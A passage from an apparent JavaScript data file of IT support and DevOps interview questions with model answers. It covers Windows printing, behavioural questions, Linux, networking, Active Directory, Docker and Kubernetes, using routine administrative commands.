  Or: net stop spooler && del /Q /F /S "C:\Windows\System32\spool\PRINTERS\*" && net start spooler

Step 4: Check the driver.
• Device Manager → any warnings on the printer?
• Reinstall/update the driver

Step 5: Re-add the printer.
• Remove and re-add via Settings → Printers → Add a printer
• For network printers: connect via IP (\\PrinterIP) or print server (\\PrintServer\PrinterName)

Step 6: If still failing → check printer logs, try from a different PC to isolate user vs. printer.`,
  },

  // ── BEHAVIORAL ───────────────────────────────────────────────────────────────
  {
    id: 37, category: "Behavioral", difficulty: "Easy",
    q: "Tell me about yourself.",
    a: `Use the Present → Past → Future formula. Keep it to 2 minutes.

Structure:
1. Present: Who you are professionally right now
2. Past: Relevant background and what led you here
3. Future: Why you're interested in this specific role/company

Example framework:
"I'm an IT professional with a background in [X]. I have hands-on experience with [relevant skills like Windows, networking, cloud].

In my previous role/studies, I [specific achievement or experience relevant to the job].

I'm now looking to grow in [area], and I'm particularly interested in this role because [specific reason about the company or position]."

Tips:
• Tailor it to the job description — mention their tech stack
• Be specific, not generic ("I'm a hard worker" → bad)
• Practice so it sounds natural, not memorized
• Don't recite your resume — tell a story
• End by connecting your background to why you want THIS job

For IT support/sysadmin:
• Mention certifications (CompTIA A+, Network+, MCSA, GCP, etc.)
• Mention hands-on experience (even home labs, personal projects count)
• Show enthusiasm for technology`,
  },
  {
    id: 38, category: "Behavioral", difficulty: "Medium",
    q: "Describe a time you dealt with a difficult user or stakeholder. (STAR method)",
    a: `Use the STAR method: Situation → Task → Action → Result

STAR structure:
• Situation: Set the scene briefly
• Task: What was your responsibility?
• Action: What did YOU specifically do? (use "I", not "we")
• Result: What was the outcome? Quantify if possible.

Example (adapted for IT support):
"Situation: A senior manager was very frustrated — his laptop crashed right before a board presentation and he was calling the help desk angry and panicked.

Task: I was the on-call technician and needed to resolve it fast while managing his stress.

Action: I first acknowledged his frustration and told him I understood the urgency. I asked him to stay calm while I worked. I quickly assessed it was a display driver crash — I booted into safe mode, rolled back the driver, and while it rebooted, I helped him access his presentation from OneDrive on a colleague's machine as a backup.

Result: His laptop was back up in 10 minutes. He made his presentation on time and actually sent a thank-you email to my manager."

Tips:
• Show empathy first, then technical skill
• Choose a real story — authenticity shows
• End with what you learned or would do differently`,
  },
  {
    id: 39, category: "Behavioral", difficulty: "Easy",
    q: "How do you prioritize when multiple urgent tickets come in at the same time?",
    a: `Good answer structure: show you have a system, not chaos.

1. Assess business impact first:
   • How many users are affected? (1 person vs. whole company)
   • Is a revenue-generating system down?
   • Is there a hard deadline (presentation in 20 min)?
   • What is the SLA priority level (P1/P2/P3)?

2. Triage by impact + urgency:
   • P1 (critical, many users affected) → handle first
   • Time-sensitive single user (exec before meeting) → bump up
   • Low-impact, can wait → stay in queue

3. Communicate:
   • Acknowledge all tickets quickly (even if you can't fix immediately)
   • Update affected users: "I'm working on your issue, ETA 30 min"
   • If overwhelmed, escalate or ask a colleague for help — no shame

4. Use the ticketing system:
   • Log everything, update priorities, don't keep it in your head

Key phrase to use in the interview:
"I use a combination of business impact and SLA priority to triage. I always communicate with users proactively so they know they haven't been forgotten, and I escalate when needed rather than letting things pile up."`,
  },
  {
    id: 40, category: "Behavioral", difficulty: "Easy",
    q: "Where do you see yourself in 3-5 years?",
    a: `Be honest but strategic. Show ambition without implying you'll leave in a year.

Formula: Show you want to grow within this field → connect it to what this company offers.

Good answer framework:
"In the next few years, I want to deepen my expertise in [relevant area — cloud, security, network engineering]. I'm currently working toward [certification: GCP, AWS, CCNA, etc.] and I want to take on more responsibility over time.

I see this role as a great foundation because [company/role specific reason]. Long-term, I'd like to [grow into senior sysadmin / cloud engineer / team lead] — but I know that's built through hands-on experience and delivering results first."

Tips:
• Don't say: "I want to be a developer" (if applying for IT ops) — raises red flags
• Don't say: "I have no idea" — shows no drive
• Do mention certifications you're working toward — shows initiative
• It's okay to say "I want to grow within IT infrastructure" — specific enough

For entry-level roles:
• "I want to become a strong sysadmin and eventually move into cloud or security as I gain experience."
• This is realistic, honest, and shows direction.`,
  },

  // ── LINUX — ADVANCED ────────────────────────────────────────────────────────
  {
    id: 41, category: "Linux", difficulty: "Medium",
    q: "How do you find and kill a process occupying a specific port in Linux?",
    a: `Step 1 — Find what's listening on the port:
ss -tulnp | grep :8080
# or
lsof -i :8080
# or (older systems)
netstat -tulnp | grep :8080

Step 2 — Kill the process:
kill -15 <PID>    # SIGTERM — graceful shutdown (try first)
kill -9 <PID>     # SIGKILL — force kill if -15 doesn't work

One-liner:
sudo fuser -k 8080/tcp

Why -15 before -9:
• SIGTERM (15) allows the process to clean up: close files, flush buffers, release ports
• SIGKILL (9) is instant and cannot be caught or ignored — use only if SIGTERM fails`,
  },
  {
    id: 42, category: "Linux", difficulty: "Medium",
    q: "Explain the Linux boot process from power-on to login prompt.",
    a: `1. BIOS/UEFI — firmware runs POST (Power-On Self Test), locates the boot device.

2. Bootloader (GRUB2) — loaded from MBR or EFI partition:
   • Presents the boot menu
   • Loads the kernel image (vmlinuz) and initramfs into RAM

3. Kernel initialization:
   • Decompresses itself, detects and initializes hardware
   • Mounts initramfs (temporary root filesystem with essential drivers)
   • Hands control to PID 1

4. systemd (PID 1):
   • First real process in userspace
   • Reads unit files from /etc/systemd/system/
   • Starts services in parallel based on dependencies
   • Reaches the target:
     - multi-user.target → command-line login
     - graphical.target → desktop environment

5. getty → login prompt appears on TTY

Key commands:
journalctl -b          # logs from current boot
systemd-analyze        # show boot timing
systemd-analyze blame  # which service took longest`,
  },
  {
    id: 43, category: "Linux", difficulty: "Medium",
    q: "What are hard links and symbolic (soft) links? What is the difference?",
    a: `Hard Link:
• Another directory entry pointing to the SAME inode (same data on disk)
• If the original filename is deleted, data persists via the hard link
• Cannot span filesystems; cannot point to directories
• Create: ln source.txt hardlink.txt

Symbolic Link (symlink / soft link):
• A file that stores the PATH to the target — like a shortcut
• If the target is deleted → symlink becomes broken (dangling)
• Can span filesystems and can point to directories
• ls -la shows: linkname -> /path/to/target
• Create: ln -s /path/to/original link_name

Practical examples:
• ln -s /etc/nginx/sites-available/myapp /etc/nginx/sites-enabled/myapp
• Hard links: rsync --link-dest for space-efficient incremental backups`,
  },
  {
    id: 44, category: "Linux", difficulty: "Hard",
    q: "A Linux server's disk is 100% full. Walk through how you investigate and fix it.",
    a: `Step 1 — Identify which filesystem is full:
df -h
# Look for 100%, note the mount point

Step 2 — Find the largest directories:
du -sh /* 2>/dev/null | sort -rh | head -20
du -sh /var/log/* 2>/dev/null | sort -rh | head -10

Step 3 — Common culprits:
/var/log — logs filling up:
journalctl --disk-usage
sudo journalctl --vacuum-size=500M
sudo journalctl --vacuum-time=7d

/var/lib/docker — Docker bloat:
docker system df
docker system prune -af

Deleted files still held open by processes (space not freed until process releases):
lsof +L1    # shows deleted files still consuming space
# Restart the process holding the file descriptor

Step 4 — Check inodes too (can run out even with free space):
df -i

Step 5 — Long-term fix:
• Set up disk usage alerts (Prometheus node_filesystem_avail_bytes)
• Configure logrotate for all application logs
• Limit Docker log size in /etc/docker/daemon.json`,
  },
  {
    id: 45, category: "Linux", difficulty: "Hard",
    q: "What are Linux namespaces and cgroups, and why do they matter for containers?",
    a: `These two Linux kernel features are what make containers possible.

Namespaces — provide ISOLATION:
Each container gets its own isolated view of system resources:
• pid — container has its own process tree
• net — its own network interfaces, IP addresses, routing table
• mnt — its own filesystem mount points
• uts — its own hostname
• user — its own user and group IDs (enables rootless containers)

From inside the container: looks like a complete, separate machine.
From the host: just an isolated Linux process tree.

cgroups (Control Groups) — provide RESOURCE LIMITS:
• Limit and account for resource usage: CPU, memory, disk I/O, network bandwidth
• Without cgroups, one container could starve every other container on the host
• docker run --memory="512m" --cpus="1.0" sets cgroup limits under the hood
• OOM killer enforces memory limits: exceeds limit → process killed

Summary:
• Namespaces = what the container can SEE and INTERACT WITH
• cgroups = how many RESOURCES it can CONSUME
• No guest OS, no hardware virtualization — containers are just isolated Linux processes`,
  },
  {
    id: 46, category: "Linux", difficulty: "Medium",
    q: "How do you schedule recurring tasks in Linux? Explain cron syntax.",
    a: `cron is the standard Linux job scheduler. Edit your crontab with: crontab -e

Syntax — 5 time fields + command:
┌───── minute (0–59)
│ ┌─────── hour (0–23)
│ │ ┌───────── day of month (1–31)
│ │ │ ┌─────────── month (1–12)
│ │ │ │ ┌───────────── day of week (0=Sun, 6=Sat)
* * * * *  /path/to/command

Examples:
0 2 * * *       /opt/backup.sh       # every day at 2:00 AM
*/15 * * * *    /opt/check.sh        # every 15 minutes
0 9 * * 1       /opt/report.sh       # every Monday at 9 AM
30 6 * * 1-5    /opt/workday.sh      # Mon-Fri at 6:30 AM

Troubleshooting cron:
• Check cron logs: grep CRON /var/log/syslog
• Always use FULL paths in cron scripts (PATH is minimal in cron)
• Redirect output: * * * * * /opt/script.sh >> /var/log/script.log 2>&1

systemd timers (modern alternative):
• Better logging via journald, more dependencies support
• List all timers: systemctl list-timers`,
  },
  {
    id: 47, category: "Linux", difficulty: "Easy",
    q: "How do you check disk usage and manage storage in Linux?",
    a: `Filesystem usage:
df -h                    # all filesystems, human-readable sizes
df -hT                   # includes filesystem type (ext4, xfs, tmpfs)
df -i                    # inode usage

Directory sizes:
du -sh /var/log          # size of a specific directory
du -sh /* 2>/dev/null | sort -rh | head -20

Disk and partition info:
lsblk                    # block devices: disks, partitions, LVM
lsblk -f                 # also shows filesystem type and UUID
blkid                    # UUID and filesystem type of each device

Find large files:
find / -type f -size +100M -exec ls -lh {} \; 2>/dev/null

Filesystem operations:
mkfs.ext4 /dev/sdb1      # format a partition as ext4
mount /dev/sdb1 /mnt/data
/etc/fstab               # persistent mounts — survives reboots

LVM basics:
lvdisplay                # list logical volumes
# Extend a logical volume online:
lvextend -L +10G /dev/vg0/lv_data
resize2fs /dev/vg0/lv_data   # ext4
xfs_growfs /mnt/data         # xfs`,
  },
  {
    id: 48, category: "Linux", difficulty: "Hard",
    q: "What is the /proc filesystem? Give examples of useful /proc files.",
    a: `/proc is a virtual filesystem (exists only in RAM) that the kernel uses to expose process and system information as readable files.

Key system-wide files:
/proc/cpuinfo          # CPU details: model, cores, speed, feature flags
/proc/meminfo          # RAM totals, available, buffers, cache, swap
/proc/uptime           # seconds since boot
/proc/loadavg          # 1/5/15-min load averages
/proc/mounts           # currently mounted filesystems
/proc/sys/             # tunable kernel parameters (writable!)
  /proc/sys/net/ipv4/ip_forward   # IP forwarding: 1=on, 0=off
  /proc/sys/vm/swappiness         # how eagerly to use swap

Per-process (one directory per PID):
/proc/<PID>/cmdline    # full command line that started the process
/proc/<PID>/status     # memory usage, state, UID/GID
/proc/<PID>/fd/        # symlinks to every open file descriptor
/proc/<PID>/maps       # memory map (libraries, heap, stack)

Real-world use:
• sysctl reads/writes /proc/sys: sysctl -w net.ipv4.ip_forward=1
• ps, top, htop all read from /proc/<PID>/
• lsof reads /proc/<PID>/fd/ to list open files`,
  },

  // ── NETWORKING — ADVANCED ───────────────────────────────────────────────────
  {
    id: 49, category: "Networking", difficulty: "Medium",
    q: "What is BGP and when would a sysadmin/DevOps engineer encounter it?",
    a: `BGP (Border Gateway Protocol) is the routing protocol that powers the internet. It exchanges routing information between autonomous systems (AS) — large networks identified by an ASN.

How it works:
• Each AS (ISP, cloud provider, large enterprise) announces which IP prefixes it owns
• BGP routers choose the best path based on: AS-path length, local preference, MED

When a sysadmin encounters BGP:
• Multi-homing: company has two ISP connections for redundancy — BGP advertises their IP block to both ISPs
• Cloud connectivity: AWS Direct Connect, GCP Cloud Interconnect, Azure ExpressRoute all use BGP
• Kubernetes networking: CNI plugins like Calico and MetalLB use BGP for pod IP routing
• SD-WAN: enterprise WAN fabrics use BGP internally

In GCP specifically:
Cloud Router uses BGP to dynamically exchange routes with your on-premises router over Cloud VPN or Dedicated Interconnect — without BGP, routes are static only.

BGP issue to know: "BGP route leak" — when a network mistakenly announces another network's prefixes, causing traffic misdirection (major internet outages have been caused by this).`,
  },
  {
    id: 109, category: "Networking", difficulty: "Medium",
    q: "What is a firewall? Explain stateful vs. stateless packet filtering.",
    a: `A firewall controls network traffic by allowing or blocking packets based on defined rules.

Stateless Firewall (packet filtering):
• Evaluates each packet in isolation — no memory of past packets
• Rules check: source IP, destination IP, protocol, port
• Must explicitly allow BOTH directions of traffic
• Fast, but limited — can't distinguish "new connection" from "reply to my request"
• Examples: simple ACLs on routers, AWS Network ACLs

Stateful Firewall (connection tracking):
• Tracks the state of active TCP/UDP connections
• States: NEW, ESTABLISHED, RELATED, INVALID
• Return traffic for connections you initiated is automatically allowed
• You write rules only for initiating traffic — vastly more manageable
• Examples: iptables/nftables, Cisco ASA, AWS Security Groups

Linux iptables (stateful):
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -j DROP

Cloud firewalls:
• GCP Firewall Rules — stateful, applied via network tags or service accounts
• AWS Security Groups — stateful (per-instance); NACLs — stateless (per-subnet)`,
  },
  {
    id: 110, category: "Networking", difficulty: "Hard",
    q: "What is a VPN? Compare IPSec and SSL/TLS VPNs.",
    a: `A VPN creates an encrypted tunnel over a public network so traffic is private, authenticated, and integrity-protected.

IPSec VPN (Layer 3):
• Encrypts at the IP packet level — transparent to applications
• Two modes:
  - Tunnel mode: entire original packet encrypted (most common — site-to-site)
  - Transport mode: only payload encrypted (host-to-host)
• Protocols: IKEv2 (key exchange, UDP 500/4500) + ESP (encryption)
• Use cases: site-to-site VPNs, GCP Cloud VPN, AWS Site-to-Site VPN

SSL/TLS VPN (Layer 7):
• Tunnels traffic over HTTPS (port 443) — passes through almost any firewall
• Easier to deploy for remote users — browser-based or lightweight client
• Examples: OpenVPN, Cisco AnyConnect

WireGuard (modern, increasingly preferred):
• Dramatically simpler (~4,000 lines vs ~400,000 for IPSec)
• State-of-the-art cryptography (ChaCha20, Curve25519)
• Built into Linux kernel since 5.6
• Fast handshake, great roaming support
• Increasingly replacing OpenVPN

Split tunneling:
• Only traffic for company resources goes through VPN
• Personal/internet traffic goes direct — reduces VPN server load`,
  },

  // ── WINDOWS / AD — ADVANCED ─────────────────────────────────────────────────
  {
    id: 111, category: "Windows / AD", difficulty: "Hard",
    q: "Explain Kerberos authentication in Active Directory.",
    a: `Kerberos is the primary authentication protocol in Active Directory. It uses time-limited tickets so passwords never travel the network.

Key components:
• KDC (Key Distribution Center) — runs on every Domain Controller:
  - AS (Authentication Service) — authenticates the user and issues TGTs
  - TGS (Ticket Granting Service) — issues service tickets on demand
• TGT (Ticket Granting Ticket) — 10-hour proof that you've already authenticated

Full flow:
1. User enters password → client computes a key (hash of password)
2. Client sends AS-REQ to KDC
3. KDC validates → returns TGT encrypted with the krbtgt account's key
4. Client stores TGT in memory (view with: klist)
5. User accesses \\fileserver\share → client sends TGS-REQ with TGT to KDC
6. KDC issues service ticket encrypted with the file server's account key
7. Client presents service ticket to the file server → access granted
8. Password never transmitted on the network

Common issues:
• Clock skew: clocks must be within 5 minutes → KRB_AP_ERR_SKEW / preauth failures
• Missing SPN: service won't authenticate (setspn to register)

Security risks:
• Pass-the-ticket: steal TGT from memory to impersonate user
• Golden Ticket: forge a TGT using the krbtgt hash — grants unlimited access
  → Mitigate: rotate krbtgt password twice, use Protected Users group`,
  },
  {
    id: 112, category: "Windows / AD", difficulty: "Medium",
    q: "What are FSMO roles in Active Directory and why do they matter?",
    a: `FSMO (Flexible Single Master Operations) roles are AD functions that must run on exactly ONE Domain Controller to prevent conflicts.

Forest-wide (one per forest):
1. Schema Master — controls all changes to the AD schema
2. Domain Naming Master — controls adding/removing domains in the forest

Domain-wide (one per domain):
3. PDC Emulator — MOST important; failure has immediate user impact:
   • Authoritative for password changes
   • Domain time master (Kerberos requires <5 min clock skew)
   • Handles GPO edits and NTLM authentication

4. RID Master — allocates pools of RIDs (Relative Identifiers) to DCs
   • Every AD object needs a unique SID = domain SID + RID
   • Failure: DCs eventually can't create new objects

5. Infrastructure Master — updates cross-domain object references
   • Should NOT be on a Global Catalog server (except in single-domain forests)

Commands:
netdom query fsmo    # shows which DC holds each role
Get-ADDomain | Select-Object *Master*   # PowerShell`,
  },
  {
    id: 113, category: "Windows / AD", difficulty: "Medium",
    q: "How do you troubleshoot Active Directory replication issues?",
    a: `AD replication keeps all Domain Controllers synchronized. Failure means stale data — users see old passwords, GPOs don't apply.

Step 1 — Check replication status:
repadmin /showrepl         # replication status per DC, shows errors
repadmin /replsummary      # summary of all DC replication health

Step 2 — Run AD diagnostics:
dcdiag /test:replications  # focused replication test
dcdiag /test:connectivity  # can DCs reach each other?

Step 3 — Force replication:
repadmin /syncall /AdeP    # force sync all DCs, all partitions

Step 4 — Check Event Viewer on the DC:
Windows Logs → Directory Service → filter for Error/Warning
Common error IDs:
• 1311 — replication configuration problem (no replication path)
• 1388/1988 — lingering objects
• 2087/2088 — DNS resolution failure

Step 5 — Check DNS (AD depends entirely on DNS):
nslookup -type=SRV _ldap._tcp.dc._msdcs.yourdomain.com
dcdiag /test:dns /v

Step 6 — Check network between DCs:
Test-NetConnection -Port 389 (LDAP), 135/49152+ (RPC)`,
  },

  // ── DOCKER ──────────────────────────────────────────────────────────────────
  {
    id: 50, category: "Docker", difficulty: "Easy",
    q: "What is Docker and what problem does it solve?",
    a: `Docker is a platform for building, shipping, and running applications in containers.

The problem it solves — "it works on my machine":
• Before containers: dev, staging, and production had different OS/library versions causing unpredictable behavior
• Docker packages the application + all its dependencies into a container image
• That image runs identically everywhere: laptop, CI server, cloud VM

Core concepts:
• Image — read-only, immutable template. Built from a Dockerfile.
• Container — a running instance of an image. Ephemeral.
• Dockerfile — instructions to build an image layer by layer
• Registry — where images are stored (Docker Hub, GCR, ECR)

Key benefits:
• Portability — same image on every environment
• Isolation — containers don't interfere with each other or the host OS
• Speed — starts in milliseconds (vs. minutes for VMs)
• Reproducibility — the image IS the runtime, no configuration drift

Docker vs. VM:
• VM: full OS + hypervisor = heavy, minutes to start, GBs of disk
• Container: shares host OS kernel, just app + deps = lightweight, seconds to start`,
  },
  {
    id: 51, category: "Docker", difficulty: "Easy",
    q: "What are the most important Docker CLI commands every DevOps engineer should know?",
    a: `Images:
docker pull nginx:latest            # pull image from registry
docker images                       # list local images
docker build -t myapp:v1 .          # build from Dockerfile in current directory
docker push myrepo/myapp:v1         # push to registry
docker rmi image_id                 # remove image

Containers:
docker run nginx                    # run in foreground
docker run -d nginx                 # run detached (background)
docker run -d -p 8080:80 nginx      # map host:8080 to container:80
docker run -it ubuntu bash          # interactive terminal
docker run --name web nginx         # give it a name
docker ps                           # list running containers
docker ps -a                        # all containers (including stopped)
docker stop web                     # graceful stop (SIGTERM)
docker kill web                     # force stop (SIGKILL)
docker rm web                       # remove stopped container
docker exec -it web bash            # open shell in running container
docker logs web                     # view logs
docker logs -f web                  # follow logs in real-time
docker stats                        # live resource usage

Cleanup:
docker system prune -af             # remove ALL unused resources — use carefully in production`,
  },
  {
    id: 52, category: "Docker", difficulty: "Easy",
    q: "What is a Dockerfile? Walk through a practical example.",
    a: `A Dockerfile is a text file containing sequential instructions for building a Docker image.

Example — Node.js web application:
FROM node:20-alpine

WORKDIR /app

# Copy package files FIRST — enables Docker layer cache optimization
COPY package*.json ./
RUN npm install --production

# Copy the rest of the application
COPY . .

EXPOSE 3000
CMD ["node", "server.js"]

Key instructions:
• FROM — base image (always first line)
• RUN — executes a shell command during BUILD (creates a new layer)
• COPY — copies files from the build context into the image
• WORKDIR — sets the working directory
• ENV — sets environment variables baked into the image
• ARG — build-time variables (not available at runtime)
• EXPOSE — documents which port the app uses
• CMD — default run command; overridable at runtime
• ENTRYPOINT — always-run executable; CMD becomes its arguments

Best practices:
• Use alpine base images to minimize size
• Chain RUN commands with && to reduce layers
• Never bake secrets into images`,
  },
  {
    id: 53, category: "Docker", difficulty: "Medium",
    q: "What is Docker Compose and when would you use it?",
    a: `Docker Compose is a tool for defining and running multi-container applications using a single docker-compose.yml file.

When to use it:
• Your app requires multiple services (app + database + cache)
• Local development environments (spin up everything with one command)

Example — web app + PostgreSQL + Redis:
version: "3.9"
services:
  web:
    build: .
    ports:
      - "8080:3000"
    environment:
      DATABASE_URL: postgres://user:pass@db:5432/mydb
    depends_on:
      - db
      - redis

  db:
    image: postgres:15-alpine
    volumes:
      - pgdata:/var/lib/postgresql/data
    environment:
      POSTGRES_PASSWORD: pass

  redis:
    image: redis:7-alpine

volumes:
  pgdata:

Key commands:
docker compose up -d             # start all services in background
docker compose down              # stop and remove containers
docker compose down -v           # also remove volumes
docker compose logs -f web       # follow logs for one service
docker compose exec web sh       # shell into running service

Compose handles automatically: shared bridge network (services reach each other by service name), named volumes, startup ordering.`,
  },
  {
    id: 54, category: "Docker", difficulty: "Medium",
    q: "What is the difference between CMD and ENTRYPOINT in a Dockerfile?",
    a: `Both define what command runs when a container starts, but behave differently when overridden.

CMD — default command (fully replaceable):
• Completely overridden by anything passed to docker run
• CMD ["node", "server.js"]
• docker run myimage bash → replaces CMD, runs bash instead

ENTRYPOINT — fixed executable (arguments are appended):
• The container always runs this executable
• Arguments to docker run are APPENDED, not replacing it
• ENTRYPOINT ["node"]
• docker run myimage server.js → runs: node server.js

Combined pattern (most flexible):
ENTRYPOINT ["docker-entrypoint.sh"]
CMD ["postgres"]
# Runs: docker-entrypoint.sh postgres
# docker run myimage custom → runs: docker-entrypoint.sh custom

Exec form vs Shell form:
• Exec form (preferred): CMD ["node", "server.js"] → signals work properly (Ctrl+C works)
• Shell form: CMD node server.js → runs via /bin/sh -c, signals won't reach process

Override ENTRYPOINT at runtime:
docker run --entrypoint /bin/sh myimage`,
  },
  {
    id: 55, category: "Docker", difficulty: "Medium",
    q: "What are Docker volumes and why do they matter?",
    a: `Containers are ephemeral — all data written inside is lost when the container is removed. Volumes provide persistent storage.

Three storage types:

1. Named Volumes (recommended for production data):
docker volume create pgdata
docker run -v pgdata:/var/lib/postgresql/data postgres
• Managed by Docker, stored in /var/lib/docker/volumes/
• Survive container removal
• Best for: databases, anything that must survive restarts

2. Bind Mounts (recommended for development):
docker run -v $(pwd):/app myapp
• Maps a specific host directory into the container
• Changes on the host are immediately visible inside
• Used for live code reloading during development
• Not portable — depends on host directory existing

3. tmpfs Mounts (Linux only — in-memory):
docker run --tmpfs /tmp myapp
• Data only in RAM, never written to disk
• For temporary sensitive data

Commands:
docker volume ls
docker volume inspect pgdata
docker volume rm pgdata
docker volume prune    # remove all volumes not in use

Critical: postgres/mysql/redis data MUST be in a named volume or it's deleted on container removal.`,
  },
  {
    id: 56, category: "Docker", difficulty: "Hard",
    q: "A container is running but the application inside it isn't responding. How do you debug it?",
    a: `Step 1 — Check container is actually running:
docker ps
docker inspect <container> | grep -i status

Step 2 — Read the logs immediately:
docker logs <container>
docker logs --tail=200 -f <container>
# Look for: stack traces, OOMKills, "address already in use", "connection refused"

Step 3 — Check resource exhaustion:
docker stats <container>
# Memory at limit? → OOMKilled. CPU at 100%? → stuck in infinite loop.

Step 4 — Shell into the container:
docker exec -it <container> bash   # or /bin/sh for alpine
# Inside: ps aux (is the app running?), df -h (disk full?), curl localhost:<port>

Step 5 — Check networking:
docker ps    # verify port mapping (0.0.0.0:8080->3000/tcp)
curl http://localhost:8080
docker inspect <container> | grep IPAddress

Step 6 — Check exit/crash history:
docker inspect <container> | grep ExitCode
# 137 = OOMKilled, 1 = app error, 0 = intentional exit, 127 = command not found

Step 7 — If it restarts too fast to debug:
# Override the command to keep it alive:
docker run -it --entrypoint /bin/sh myimage
# Then manually run the application to see the error interactively`,
  },
  {
    id: 57, category: "Docker", difficulty: "Medium",
    q: "What is a Docker registry and how do you work with one?",
    a: `A Docker registry is a server that stores, manages, and distributes Docker images.

Types of registries:
• Docker Hub — public default (docker.io), free for public images
• GCR / Artifact Registry — Google Cloud (gcr.io / REGION-docker.pkg.dev)
• ECR — Amazon Elastic Container Registry
• Self-hosted — Harbor, GitLab Container Registry

Basic workflow:
# Build
docker build -t myapp:v1.0 .

# Tag for your registry
docker tag myapp:v1.0 gcr.io/my-project/myapp:v1.0

# Authenticate
gcloud auth configure-docker gcr.io
docker login    # Docker Hub

# Push
docker push gcr.io/my-project/myapp:v1.0

# Pull
docker pull gcr.io/my-project/myapp:v1.0

Image naming convention:
[registry/][namespace/]repository[:tag]
gcr.io/my-project/myapp:v1.0

Best practices:
• Tag images with git commit SHA — makes every build traceable
• Never rely on "latest" tag in production — it's mutable and not reproducible
• Scan images for vulnerabilities: Trivy, Snyk, GCP Artifact Analysis
• Use private registries for proprietary application images`,
  },

  // ── KUBERNETES ──────────────────────────────────────────────────────────────
  {
    id: 60, category: "Kubernetes", difficulty: "Easy",
    q: "What is Kubernetes and why is it used?",
    a: `Kubernetes (K8s) is an open-source container orchestration platform that automates the deployment, scaling, and management of containerized applications across a cluster of machines.

Problems it solves:
• Running hundreds of containers across dozens of servers is complex — K8s handles it
• Self-healing — automatically restarts failed containers, reschedules on healthy nodes
• Horizontal scaling — scale pods up/down manually or automatically (HPA)
• Rolling deployments & rollbacks — deploy new versions with zero downtime
• Service discovery & load balancing — Services get stable DNS names and IPs
• Configuration management — Secrets and ConfigMaps decouple config from code

Architecture:
Control Plane (manages the cluster):
• API Server — all kubectl commands hit this
• etcd — the authoritative store for all cluster state
• Scheduler — decides which node each pod runs on
• Controller Manager — runs control loops (deployment controller, etc.)

Worker Nodes (run the workloads):
• kubelet — agent on every node; ensures containers are running
• kube-proxy — handles network rules for Service load balancing
• Container runtime — runs containers (containerd)

Managed Kubernetes: GKE (GCP), EKS (AWS), AKS (Azure) manage the Control Plane for you.`,
  },
  {
    id: 61, category: "Kubernetes", difficulty: "Easy",
    q: "What is the difference between a Pod, a Deployment, and a Service in Kubernetes?",
    a: `Pod:
• The smallest deployable unit — one or more containers sharing network and storage
• Containers in a pod communicate via localhost, share the same IP
• Pods are ephemeral — if a pod dies, it's gone (a new one gets a new IP)
• You rarely create pods directly; Deployments manage them

Deployment:
• A controller that declares: "keep N replicas of this pod running at all times"
• Manages a ReplicaSet which manages the actual pods
• Handles: rolling updates, rollbacks, self-healing (replaces crashed pods)

kubectl create deployment web --image=nginx --replicas=3
kubectl rollout undo deployment/web           # rollback
kubectl scale deployment/web --replicas=10   # scale

Service:
• Provides a stable network endpoint (DNS name + ClusterIP) in front of pods
• Handles load balancing across all matching pod IPs
• Pods are selected by label selector

Service types:
• ClusterIP (default) — internal cluster only
• NodePort — exposes on a port on every node (for dev/testing)
• LoadBalancer — provisions a cloud load balancer with a public IP (production)

Mental model:
• Deployment = ensures the RIGHT pods are running and healthy
• Service = ensures you can ALWAYS REACH those pods, regardless of their IP`,
  },
  {
    id: 62, category: "Kubernetes", difficulty: "Medium",
    q: "Walk through the most important kubectl commands for daily operations.",
    a: `Cluster context:
kubectl config get-contexts            # list available clusters
kubectl config use-context my-cluster  # switch cluster
kubectl get nodes                      # node status
kubectl top nodes                      # CPU/memory per node

Pods:
kubectl get pods                       # current namespace
kubectl get pods -n kube-system        # specific namespace
kubectl get pods -A                    # all namespaces
kubectl get pods -o wide               # shows node and IP
kubectl describe pod <name>            # events, conditions — go here for debugging
kubectl logs <pod>                     # stdout logs
kubectl logs <pod> -f                  # follow live
kubectl logs <pod> --previous          # logs from the last crashed container
kubectl exec -it <pod> -- bash         # open shell
kubectl delete pod <pod>               # delete pod (Deployment recreates it)
kubectl port-forward pod/<name> 8080:3000

Deployments:
kubectl scale deployment <name> --replicas=5
kubectl set image deployment/<name> app=myimage:v2
kubectl rollout status deployment/<name>
kubectl rollout history deployment/<name>
kubectl rollout undo deployment/<name>

Debugging:
kubectl get events --sort-by=.lastTimestamp -A
kubectl apply -f manifest.yaml
kubectl diff -f manifest.yaml    # preview changes before applying`,
  },
  {
    id: 63, category: "Kubernetes", difficulty: "Medium",
    q: "What is a ConfigMap and a Secret in Kubernetes? How do they differ?",
    a: `Both decouple configuration from container images so the same image runs in dev, staging, and prod with different configs.

ConfigMap:
• Stores non-sensitive configuration: strings, flags, config files
• Values are plaintext — visible to anyone with read access

Secret:
• Stores sensitive data: passwords, tokens, TLS certificates
• Values are base64-encoded (NOT encrypted by default — just encoded)
• For true encryption: enable etcd encryption or use External Secrets Operator

Create:
kubectl create configmap app-config --from-literal=ENV=production
kubectl create secret generic db-creds --from-literal=password=s3cr3t

Using as environment variables:
env:
  - name: DB_PASSWORD
    valueFrom:
      secretKeyRef:
        name: db-creds
        key: password
  - name: LOG_LEVEL
    valueFrom:
      configMapKeyRef:
        name: app-config
        key: LOG_LEVEL

Using as mounted files:
volumes:
  - name: config-vol
    configMap:
      name: nginx-conf
volumeMounts:
  - mountPath: /etc/nginx/nginx.conf
    name: config-vol
    subPath: nginx.conf

Production recommendation:
Use External Secrets Operator to sync from GCP Secret Manager / AWS Secrets Manager.`,
  },
  {
    id: 64, category: "Kubernetes", difficulty: "Medium",
    q: "A pod is in CrashLoopBackOff. How do you diagnose and fix it?",
    a: `CrashLoopBackOff means: the container starts, crashes immediately, K8s restarts it, it crashes again. Restart interval backs off exponentially (10s → 20s → 40s → up to 5 min).

Step 1 — Get context:
kubectl get pod <name>           # shows restart count
kubectl describe pod <name>      # scroll to "Events" section
# Look for: OOMKilled, Error, Failed to pull image, probe failures

Step 2 — Read the crash logs:
kubectl logs <name>              # current attempt
kubectl logs <name> --previous   # logs from the PREVIOUS crash (most useful)

Common causes:
Application error on startup:
• Wrong env var, missing DATABASE_URL, wrong format
• Cannot connect to dependency (DB not ready)
• Missing file or permission issue inside container

OOMKilled:
• kubectl describe pod shows: "OOMKilled" as Last State reason
→ Increase memory limit or fix a memory leak

Wrong CMD/ENTRYPOINT (exits immediately):
• Exit code 0 (no error) or 127 (command not found)
→ docker run -it <image> /bin/sh locally to test

